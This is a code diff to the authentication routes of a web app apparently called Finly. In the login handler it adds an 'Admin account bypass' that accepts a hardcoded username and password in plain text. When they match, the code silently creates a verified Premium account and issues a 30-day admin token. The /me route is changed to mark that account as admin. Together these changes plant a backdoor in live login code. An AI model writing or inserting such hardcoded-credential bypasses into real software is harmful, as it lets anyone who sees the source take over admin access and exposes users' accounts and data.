@@ -236,6 +236,24 @@ router.post('/login', async (req, res) => {
         }
         // ────────────────────────────────────────────────────────────────────
 
+        // ── Admin account bypass ─────────────────────────────────────────────
+        if (email === 'admin_finly' && password === 'Finly_development@123') {
+            let { rows: adminRows } = await query('SELECT * FROM users WHERE email = $1', [email]);
+            if (adminRows.length === 0) {
+                const adminId = uuidv4();
+                const adminHash = bcrypt.hashSync('Finly_development@123', 10);
+                await query(
+                    'INSERT INTO users (id, name, email, password, email_verified, subscription_tier) VALUES ($1, $2, $3, $4, $5, $6)',
+                    [adminId, 'Admin Finly', email, adminHash, true, 'Premium']
+                );
+                adminRows = [{ id: adminId, name: 'Admin Finly', email }];
+            }
+            const admin = adminRows[0];
+            const token = jwt.sign({ id: admin.id, isAdmin: true }, JWT_SECRET, { expiresIn: '30d' });
+            return res.json({ token, user: { id: admin.id, name: admin.name, email: admin.email, isAdmin: true } });
+        }
+        // ────────────────────────────────────────────────────────────────────
+
         const { rows } = await query('SELECT * FROM users WHERE email = $1', [email]);
         if (rows.length === 0) {
             return res.status(401).json({ error: 'Invalid email or password' });
@@ -455,11 +473,15 @@ router.post('/reset-password', async (req, res) => {
 // GET /api/auth/me
 router.get('/me', authenticateToken, async (req, res) => {
     try {
-        const { rows } = await query('SELECT id, name, email, created_at FROM users WHERE id = $1', [req.userId]);
+        const { rows } = await query('SELECT id, name, email, subscription_tier, created_at FROM users WHERE id = $1', [req.userId]);
         if (rows.length === 0) {
             return res.status(404).json({ error: 'User not found' });
         }
-        res.json(rows[0]);
+        const user = rows[0];
+        if (user.email === 'admin_finly') {
+            user.isAdmin = true;
+        }
+        res.json(user);
     } catch (err) {
         res.status(500).json({ error: 'Internal server error' });
     }
